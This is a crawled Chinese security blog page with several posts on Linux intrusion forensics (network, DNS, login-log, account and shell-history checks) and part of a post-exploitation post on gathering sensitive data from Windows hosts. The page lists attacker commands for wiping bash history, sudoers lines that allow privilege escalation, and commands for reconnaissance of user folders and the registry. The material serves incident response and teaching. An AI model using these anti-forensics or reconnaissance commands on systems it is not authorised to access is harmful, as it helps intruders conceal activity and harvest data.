<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -awp</span><br><span class="line">ss -awp</span><br><span class="line">lsof | grep raw</span><br></pre></td></tr></table></figure>



<h2 id="2-异常配置检查"><a href="#2-异常配置检查" class="headerlink" title="2 异常配置检查"></a>2 异常配置检查</h2><p>用处不太大，有时能帮助识别潜在风险。</p>
<h3 id="2-1-dns配置"><a href="#2-1-dns配置" class="headerlink" title="2.1 dns配置"></a>2.1 dns配置</h3><p>关注异常的dns服务器地址，dns服务被劫持可用于流量劫持与钓鱼。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 本地 主机名=》ip映射表</span></span><br><span class="line">cat /etc/hosts</span><br><span class="line"><span class="meta">#</span><span class="bash"> dns服务配置文件</span></span><br><span class="line">cat /etc/resolv.conf</span><br></pre></td></tr></table></figure>

<p>如果自身为dns服务器且安装nscd服务时，可能特别关注缓存有无被篡改。<br>配置文件地址及日志：/etc/nscd.conf /var/log/nscd.log<br>缓存地址：/var/db/nscd/（如果有nscd服务，对应于dns缓存）</p>
<h3 id="2-2-访问控制配置"><a href="#2-2-访问控制配置" class="headerlink" title="2.2 访问控制配置"></a>2.2 访问控制配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts.allow	白名单</span><br><span class="line">/etc/hosts.deny		黑名单</span><br><span class="line">firewall-cmd --zone=public --list-ports</span><br><span class="line">iptables -L</span><br></pre></td></tr></table></figure>

<h3 id="2-3-仓库源检查"><a href="#2-3-仓库源检查" class="headerlink" title="2.3 仓库源检查"></a>2.3 仓库源检查</h3><p>防止仓库地址被篡改造成潜在风险的供应链攻击风险。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Debian系：</span></span><br><span class="line">/etc/apt/sources.list</span><br><span class="line">/etc/apt/sources.list.d/</span><br><span class="line"><span class="meta">#</span><span class="bash"> RHEL系：</span></span><br><span class="line">/etc/yum.repos.d/</span><br></pre></td></tr></table></figure>

<h3 id="2-4-网卡工作模式"><a href="#2-4-网卡工作模式" class="headerlink" title="2.4 网卡工作模式"></a>2.4 网卡工作模式</h3><p>局域网嗅探时，网卡往往被设置为混杂模式。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a|grep &quot;UPBROADCAST RUNNING PROMISC MULTICAST&quot;</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(3)-%E7%99%BB%E5%BD%95%E8%AE%B0%E5%BD%95%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(3)-%E7%99%BB%E5%BD%95%E8%AE%B0%E5%BD%95%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Linux入侵事件取证(3)-登录记录分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-22 10:16:03" itemprop="dateCreated datePublished" datetime="2021-06-22T10:16:03-08:00">2021-06-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-06-21 19:26:06" itemprop="dateModified" datetime="2021-06-21T19:26:06-08:00">2021-06-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="0x03-登录记录分析"><a href="#0x03-登录记录分析" class="headerlink" title="0x03 登录记录分析"></a>0x03 登录记录分析</h1><h2 id="1-成功登录事件"><a href="#1-成功登录事件" class="headerlink" title="1 成功登录事件"></a>1 成功登录事件</h2><p>提取成功登录的事件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot; Accepted password &quot; /var/log</span><br><span class="line">grep -rn &quot; Accepted publickey &quot; /var/log</span><br></pre></td></tr></table></figure>

<p>记录登录事件的日志比较多，大的来说分两类：一类是last日志，记录的很粗糙，这里就不展开了。一类是/var/log下的系统日志（auth，audit，secure，具体是其中的哪一个与系统系统有关）</p>
<p>下面给出一个表格，表格中的命令帮助给出：由低到高的频数登录事件</p>
<table>
<thead>
<tr>
<th><strong>系统派系</strong></th>
<th><strong>系统名称</strong></th>
<th><strong>日志路径</strong></th>
<th><strong>提取登录事件的命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian</td>
<td>Ubuntu20</td>
<td>/var/log/auth.log</td>
<td>cat auth.log |grep sshd|grep “Accepted  password”|awk ‘{print $11}’|sort -nr |uniq -c|sort -nr</td>
</tr>
<tr>
<td>Debian</td>
<td>Kali-2020</td>
<td>/var/log/auth.log</td>
<td>cat auth.log |grep sshd|grep “Accepted  password”|awk ‘{print $11}’|sort -nr |uniq -c|sort -nr</td>
</tr>
<tr>
<td>Debian</td>
<td>Kali-2020</td>
<td>/var/log/journal/</td>
<td>journalctl |grep sshd|grep “Accepted  password”|awk ‘{print $11}’|sort -nr |uniq -c|sort -nr</td>
</tr>
<tr>
<td>RHEL</td>
<td>CentOS8</td>
<td>/var/log/secure</td>
<td>cat secure|grep sshd|grep “Accepted  password”|awk ‘{print $11}’|sort -nr |uniq -c|sort -nr</td>
</tr>
<tr>
<td>any</td>
<td>any</td>
<td>/var/log/btmp(失败)</td>
<td>lastb|awk ‘{print $3}’|sort |uniq -c|sort -nr</td>
</tr>
<tr>
<td>any</td>
<td>any</td>
<td>/var/log/wtmp(成功)</td>
<td>last|grep -v “reboot”|awk ‘{print $3}’|sort  -nr|uniq -c|sort -nr</td>
</tr>
<tr>
<td>any</td>
<td>any</td>
<td>/var/log/lastlog(最近一次成功)</td>
<td>除了发现非正常账户登录以外用处不大</td>
</tr>
</tbody></table>
<p>同时，对于部分有转储的日志可以将其解压合并后进行分析，如/var/log/messages：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/log/msg ;cp -a /var/log/messages* /var/log/msg; cd /var/log/msg; gunzip -d ./*;</span><br></pre></td></tr></table></figure>



<p>已经成功登录的未知IP，使用网上的批量查询工具识别IP所在地：</p>
<p><a target="_blank" rel="noopener" href="https://ip.tool.chinaz.com/siteip">https://ip.tool.chinaz.com/siteip</a></p>
<h2 id="2-登录手段分析"><a href="#2-登录手段分析" class="headerlink" title="2 登录手段分析"></a>2 登录手段分析</h2><p>登录事件中指示“Accepted publickey”说明是公钥登录，要及时删掉账户目录下的公钥。</p>
<p>登录事件中指示“Accepted password”说明是口令登录，口令失窃有多种可能，其中一种是暴力破解，这时日志中会伴随大量的登录尝试失败事件。  </p>
<table>
<thead>
<tr>
<th align="left">系统派系</th>
<th align="left">系统类型</th>
<th align="left">日志位置</th>
<th align="left">提取登录尝试事件的命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left">RHEL</td>
<td align="left">CentOS8</td>
<td align="left">/var/log/secure</td>
<td align="left">cat secure |grep sshd|grep Failed|awk ‘{print  $11}’|sort|uniq -c|sort -nr</td>
</tr>
<tr>
<td align="left">Debian</td>
<td align="left">ubuntu20</td>
<td align="left">/var/log/auth.log</td>
<td align="left">cat auth.log|grep sshd|grep Failed|awk ‘{print  $11}’|sort|uniq -c|sort -nr</td>
</tr>
</tbody></table>
<p>嫌麻烦？也可以使用这条命令进行初筛。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/*.log|grep sshd|grep &quot;Failed&quot;|awk &#x27;&#123;print $11&quot; &quot;$9&quot; &quot;$7&#125;&#x27;|sort |uniq -c|sort -nr</span><br></pre></td></tr></table></figure>



<p>有时我们时候溯源取证时会发现日志文件被攻击者删除了，但是我们仍能通过存活进程恢复出被删除的日志文件，只要系统未重启，某进程一直会定时读写该进程即可。</p>
<p>关于文件删除恢复的问题后面专门讨论。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(2)-%E8%B4%A6%E5%8F%B7%E6%8E%92%E6%9F%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(2)-%E8%B4%A6%E5%8F%B7%E6%8E%92%E6%9F%A5/" class="post-title-link" itemprop="url">Linux入侵事件取证(2)-账号排查</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-22 10:16:01" itemprop="dateCreated datePublished" datetime="2021-06-22T10:16:01-08:00">2021-06-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-06-21 19:26:02" itemprop="dateModified" datetime="2021-06-21T19:26:02-08:00">2021-06-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="账号排查"><a href="#账号排查" class="headerlink" title="账号排查"></a>账号排查</h1><h2 id="1-新增用户"><a href="#1-新增用户" class="headerlink" title="1 新增用户"></a>1 新增用户</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">过滤所有有shell的用户</span></span><br><span class="line">cat /etc/passwd|grep sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">分析最近一次/etc/passwd的变动是什么</span></span><br><span class="line">diff /etc/passwd /etc/passwd-</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 按照uid进行排序，关注uid重复的用户有木有。</span></span><br><span class="line">cat /etc/passwd|awk -F: &#x27;&#123;print $3&quot;\t&quot;$4&quot;\t&quot;$1&quot;\t&quot;$7&#125;&#x27;|sort -n|grep sh</span><br></pre></td></tr></table></figure>

<ul>
<li>实际上/etc/passwd-这一文件常被运维人员和攻击者忽略，对它进行时间戳分析，可以相对有效的帮助定位账户操作的具体时间。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stat /etc/passwd-</span><br></pre></td></tr></table></figure>

<h2 id="2-sudo用户识别"><a href="#2-sudo用户识别" class="headerlink" title="2 sudo用户识别"></a>2 sudo用户识别</h2><h3 id="2-1-异常sudo用户"><a href="#2-1-异常sudo用户" class="headerlink" title="2.1 异常sudo用户"></a>2.1 异常sudo用户</h3><p>识别加入sudo组的用户，查看用户组下有无异常用户</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">RHEL系:</span></span><br><span class="line">cat /etc/gshadow|grep wheel</span><br><span class="line"><span class="meta">#</span><span class="bash">Debian系：</span></span><br><span class="line">cat /etc/gshadow|grep admin</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-2-sudo配置提权"><a href="#2-2-sudo配置提权" class="headerlink" title="2.2 sudo配置提权"></a>2.2 sudo配置提权</h3><p>配置文件中出现以下配置之一均会导致提权问题，但是该问题是否由攻击者引入往往很难说，需要结合其他线索进行分析。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aplyc1a ALL=(root) NOPASSWD:/usr/bin/*,/usr/sbin/*</span><br><span class="line">aplyc1a ALL=(ALL:ALL) ALL</span><br><span class="line">Defaults timestamp_timeout=-1</span><br><span class="line">Defaults !tty_tickets</span><br><span class="line">Defaults:aplyc1a  !authenticate</span><br></pre></td></tr></table></figure>



<h2 id="3-未知公钥"><a href="#3-未知公钥" class="headerlink" title="3 未知公钥"></a>3 未知公钥</h2><p>登录公钥提取</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">USER_LIST=`cat /etc/passwd|grep bash | awk -F: &#x27;&#123;print $1&#125;&#x27;`</span><br><span class="line">for i in $USER_LIST; do cat ~$&#123;USER_LIST&#125;/.ssh/authorized_keys; done</span><br><span class="line"><span class="meta">#</span><span class="bash">或者</span></span><br><span class="line">cat /etc/passwd |cut -d: -f 6 | xargs -I@ /bin/sh -c &quot;cat @/.ssh/authorized_keys 2&gt;/dev/null&quot;| sort| uniq -c</span><br></pre></td></tr></table></figure>

<p>对于发现的公钥，可以参考下面办法，识别是否由未知IP的未知登录。（不用管公钥后的用户名信息是否存在）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn `sed -n &#x27;1p&#x27; ~/.ssh/authorized_keys |ssh-keygen -lf -|awk &#x27;&#123;print $2&#125;&#x27;` /var/log</span><br></pre></td></tr></table></figure>



<h2 id="4-弱口令问题"><a href="#4-弱口令问题" class="headerlink" title="4 弱口令问题"></a>4 弱口令问题</h2><p>这个通过询问运维人员基本可以得到答案。也可以结合登陆日志进行分析。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(1)-%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(1)-%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Linux入侵事件取证(1)-历史记录分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-22 10:16:00" itemprop="dateCreated datePublished" datetime="2021-06-22T10:16:00-08:00">2021-06-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-06-21 19:25:57" itemprop="dateModified" datetime="2021-06-21T19:25:57-08:00">2021-06-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="历史记录分析"><a href="#历史记录分析" class="headerlink" title="历史记录分析"></a>历史记录分析</h1><h2 id="1-查看历史记录"><a href="#1-查看历史记录" class="headerlink" title="1 查看历史记录"></a>1 查看历史记录</h2><p>history命令用于查看历史输入的命令。实际内容存储在~/.*sh_history中。一般Linux下的$SHELL为Bash/Dash shell，此时记录到.bash_history中。</p>
<p>我们可以重点审计其中有没有涉及到反弹shell、定时任务、打包外发、清理历史记录、敏感文件搜索的操作。对于历史记录的清理，手法有很多，下面给出一些。</p>
<table>
<thead>
<tr>
<th>常见清空历史方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>退出前，history -c</td>
<td>难以发现</td>
</tr>
<tr>
<td>vi ~/.bash_history</td>
<td>历史记录中留下该命令</td>
</tr>
<tr>
<td>vim   :set history=0   :!command</td>
<td>只会留下vim，但很少有人这么搞</td>
</tr>
<tr>
<td>export  HISTFILESIZE=</td>
<td>设置历史文件大小为0</td>
</tr>
<tr>
<td>export  HISTFILE=/dev/null</td>
<td>修改历史记录文件</td>
</tr>
<tr>
<td>/bin/sh -c ‘rm -rf  .bash_history;mkdir -p .bash_history’</td>
<td>删除文件并阻止写入新的历史记录</td>
</tr>
<tr>
<td>/bin/sh -c ‘echo  &gt; .bash_history;chattr +i .bash_history ‘</td>
<td>清空文件并阻止写入新的历史记录</td>
</tr>
<tr>
<td>echo &gt;  /root/.bash_history</td>
<td>清空历史记录文件</td>
</tr>
<tr>
<td>rm -f  /root/.bash_history</td>
<td>暴力删除文件</td>
</tr>
</tbody></table>
<h2 id="2-历史记录加固"><a href="#2-历史记录加固" class="headerlink" title="2 历史记录加固"></a>2 历史记录加固</h2><h3 id="2-1-记录数扩展"><a href="#2-1-记录数扩展" class="headerlink" title="2.1 记录数扩展"></a>2.1 记录数扩展</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br></pre></td></tr></table></figure>

<h3 id="2-2-记录内容扩展"><a href="#2-2-记录内容扩展" class="headerlink" title="2.2 记录内容扩展"></a>2.2 记录内容扩展</h3><p>编辑/etc/profile，加入以下内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br></pre></td></tr></table></figure>

<h3 id="2-3-防篡改删除加固"><a href="#2-3-防篡改删除加固" class="headerlink" title="2.3 防篡改删除加固"></a>2.3 防篡改删除加固</h3><p>使用root权限对所有history文件进行加固。只有拥有root用户才能直接编辑该文件，一定程度上起到保护作用。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chattr +a ~root/.bash_history</span><br><span class="line">chattr +a ~&#123;other_user&#125;/.bash_history</span><br></pre></td></tr></table></figure>

<h3 id="2-4-其他"><a href="#2-4-其他" class="headerlink" title="2.4 其他"></a>2.4 其他</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/skate6/article/details/66971077">https://blog.csdn.net/skate6/article/details/66971077</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/21/%E4%B8%BB%E6%9C%BA%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/21/%E4%B8%BB%E6%9C%BA%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">后渗透-主机敏感数据搜集</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-06-21 20:12:00 / Modified: 04:20:05" itemprop="dateCreated datePublished" datetime="2021-06-21T20:12:00-08:00">2021-06-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="0x00-文件目录操作"><a href="#0x00-文件目录操作" class="headerlink" title="0x00 文件目录操作"></a>0x00 文件目录操作</h2><h3 id="1-查找文件"><a href="#1-查找文件" class="headerlink" title="1.查找文件"></a>1.查找文件</h3><p>cmd:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r 目录名 %变量名 <span class="keyword">in</span> (匹配模式<span class="number">1</span>,匹配模式<span class="number">2</span>) <span class="keyword">do</span> 命令</span><br><span class="line"><span class="keyword">for</span> /r d: %i <span class="keyword">in</span> (*) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r d: %i <span class="keyword">in</span> (*.txt,*.jpg) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r d: %i <span class="keyword">in</span> (*shell.jsp) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure>

<h3 id="2-查看文件内容"><a href="#2-查看文件内容" class="headerlink" title="2.查看文件内容"></a>2.查看文件内容</h3><p>cmd:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> &quot;D:\www\shell.jsp&quot;</span><br></pre></td></tr></table></figure>

<p>powershell:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> <span class="string">&quot;D:\www\shell.jsp&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-删除文件"><a href="#3-删除文件" class="headerlink" title="3.删除文件"></a>3.删除文件</h3><p>cmd:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#删文件</span><br><span class="line"><span class="built_in">del</span> index.js</span><br><span class="line">#删文件夹</span><br><span class="line"><span class="built_in">rd</span> app</span><br></pre></td></tr></table></figure>

<p>powershell:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">remove-item</span> w.ps1 <span class="literal">-Force</span> <span class="literal">-Recurse</span></span><br></pre></td></tr></table></figure>

<h3 id="4-查看目录"><a href="#4-查看目录" class="headerlink" title="4.查看目录"></a>4.查看目录</h3><p>cmd:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#下载目录</span><br><span class="line"><span class="built_in">dir</span> C:\Users\<span class="variable">%username%</span>\Downloads</span><br><span class="line">#桌面</span><br><span class="line"><span class="built_in">dir</span> C:\Users\<span class="variable">%username%</span>\Desktop</span><br><span class="line">#微信</span><br><span class="line"><span class="built_in">dir</span> C:\Users\<span class="variable">%username%</span>\Documents\WeChat Files\wx*\FileStorage\File\</span><br><span class="line">#磁盘盘符数</span><br><span class="line">powershell -Command &quot;[Environment]::GetLogicalDrives()&quot;</span><br></pre></td></tr></table></figure>



<h2 id="0x01-注册表"><a href="#0x01-注册表" class="headerlink" title="0x01 注册表"></a>0x01 注册表</h2><h3 id="1-常见注册表项"><a href="#1-常见注册表项" class="headerlink" title="1.常见注册表项"></a>1.常见注册表项</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#启动项</span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">#账户</span><br><span class="line">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</span><br><span class="line">REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</span><br><span class="line">REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse</span><br><span class="line">#网口配置文件</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\</span><br><span class="line">#隐藏文件置<span class="number">0</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL</span><br><span class="line">#网络连接历史</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged</span><br></pre></td></tr></table></figure>
<h3 id="2-查看"><a href="#2-查看" class="headerlink" title="2.查看"></a>2.查看</h3><p>cmd:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</span><br><span class="line">REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse</span><br></pre></td></tr></table></figure>
<p>powershell:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span>=<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion&quot;</span></span><br><span class="line"><span class="variable">$key</span>``.CommonFilesDir</span><br></pre></td></tr></table></figure>

